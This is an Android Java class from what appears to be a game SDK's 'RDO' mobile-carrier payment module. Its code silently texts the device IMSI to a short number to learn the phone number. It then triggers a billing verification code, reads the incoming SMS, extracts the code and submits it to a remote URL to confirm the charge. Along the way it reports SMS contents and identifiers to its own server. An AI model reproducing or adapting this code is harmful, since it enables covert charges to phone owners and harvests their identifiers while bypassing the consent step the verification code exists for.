package mobi.zty.pay.sdk.rdo;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONObject;

import android.content.Context;
import android.os.Handler;
import android.os.Message;

/**
 * 福多多 RDO支付管理类
 * @author Administrator
 */
public class RDOInstance extends PaymentInterf{
	private static RDOInstance instance;
	private Handler callBHandler = null;
	private String createtime;
	private String phoneNum;
	private String vertifyNum;
	private String pay_url;
	private String pay_url1;
	String onderNo;
	private String obtain_num = "106905114047";
	
	public static RDOInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized RDOInstance scyMMpay(){
		if(instance==null){
			instance =  new RDOInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String orderid = (String) parameters[0];   //订单号
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String id = mkInfo.appId;
		final String channelId = mkInfo.spChannel;
		final String imsi = Helper.getIMSI(context);  
		pay_url = mkInfo.payUrl1;//支付请求的url
		pay_url1 = mkInfo.payUrl2;
		vertifyNum = mkInfo.vertifyNum;
		phoneNum = GameSDK.getInstance().getPhoneNum();
		obtain_num = GameSDK.getInstance().getObtainNum();
		
		if (phoneNum == null || phoneNum.trim().equals("")) {
			Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "去获取手机号码", feeIndex);
			Util_G.sendTextMessage(context, obtain_num, imsi, null, 0);// 发这条短信给平台  是为了获取手机号码
			Helper.httpGetPhonNum(GameSDK.getInstance().getNumUrl(), imsi, new Helper.Callback() {// 轮询我们自己服务端获取手机号码，

						@Override
						public void onResult(String info) {
							boolean SUCC =  false;
							if (info != null && !info.trim().equals("")) {
								try {
									JSONObject resut = new JSONObject(info);
									String num = resut.getString("mobile_num");
									if (num != null && !num.equals("")) {
										GameSDK.getInstance().setPhoneNum(num);
										phoneNum = num;
										SUCC = true;
										Util_G.debugE("RDO_pay", "phoneNum->" +phoneNum);
										Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "获取手机号码成功", feeIndex);
										sendPayHttp(pay_url, id, imsi, orderid,channelId, feeIndex);
									}
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							
							if (!SUCC) {
								PayResultInfo info1 = new PayResultInfo();
								info1.resutCode = PayConfig.NO_PHONE_NUMBEL;
								info1.retMsg = "支付失败";
								Message message = callBHandler
										.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
								message.obj = info1;
								message.sendToTarget();
								Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "获取手机号失败", feeIndex);
							}
						}
					});
		} else {
			sendPayHttp(pay_url, id, imsi, orderid, channelId,feeIndex);
		}
	}

	private void sendPayHttp(final String url1, final String cpid,
			 final String imsi,final String exdata, final String channalId,final int feeIndex) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				try {
					String url = url1+"?id="+cpid+"&ch="+channalId+"&si="+imsi+"&exdata="+exdata+"&ph="+phoneNum;
					Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "执行支付:"+url, feeIndex);
					String requestResponse = HttpRequestt.get(url).body();
					boolean isSendMsg = false;
					if (requestResponse != null && requestResponse != "") {//验证码下发成功
						isSendMsg = true;
						Util_G.debugE("RDO_pay:", requestResponse);
						onderNo = requestResponse;
						GameSDK.getInstance().getCurgGroupFeeInfo().getIntdexVerifyMap().put(feeIndex, 1);
						Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "请求验证码响应成功", feeIndex);
					}
					if (!isSendMsg) {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = "支付失败";
						
						Message message = callBHandler
								.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "请求验证码响应失败", feeIndex);
						return;
					}

				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = "支付失败";
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
					Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "请求验证码响应异常："+e.getMessage(), feeIndex);
				}
			}
		}).start();
	}
	
	@Override
	public void notifyPay(Object... parameters) {
		final int feeIndex = (Integer) parameters[0];
		final String virifyCode = (String) parameters[1];
		new Thread(new Runnable() {
			@Override
			public void run() {
				// http://io.iyazo.com/rdo/ncw.ashx?orderNo=@orderNo&vc=验证码(手机接收到的短信验证码)
				String url = pay_url1 + "?orderNo=" + onderNo + "&vc="+ virifyCode;
				Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "提交验证码：url="+url, feeIndex);
				String requestResponse = HttpRequestt.get(url).body();
				if (requestResponse != null && requestResponse != "") {
					Util_G.debugE("rdo_pay", "requestResponse->"
							+ requestResponse);
					Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "提交验证码响应"+requestResponse, feeIndex);
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					if (requestResponse.equals("OK")) {
						info.resutCode = PayConfig.BIIL_SUCC;
						info.retMsg = "提交验证码成功！";
						Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "提交验证码成功,支付成功", feeIndex);
					} else {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = "提交验证码失败";
						Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "提交验证码失败,支付失败", feeIndex);
					}
					Helper.sendPayMessageToServer(PayConfig.RDO_PAY, info.retMsg, feeIndex);
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();

				}else{
					Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "提交验证码无响应", feeIndex);
				}
			}
		}).start();
		super.notifyPay(parameters);
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "读取到验证码短信："+content, feeIndex);
		if (sendFrom.contains(vertifyNum)) {
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0
						&& !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < 6) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			String  vetif_vode = content.substring(startIndex,
					endIndex);
			if (vetif_vode!=null&&!vetif_vode.equals("")) {
				Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "读取到验证码:"+vetif_vode, feeIndex);
				notifyPay(feeIndex,vetif_vode);
				Util_G.debugE("ALLPAY", "vertifyNum===》》"+vetif_vode);
			}else{
				Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "读取到验证码失败", feeIndex);
			}
		}else{
			Helper.sendPayMessageToServer(PayConfig.RDO_PAY, "验证码端口配置错误:"+sendFrom+"vertifyNum="+vertifyNum, feeIndex);
		}
		super.sendVerifyCode(parameters);
	}
}
	
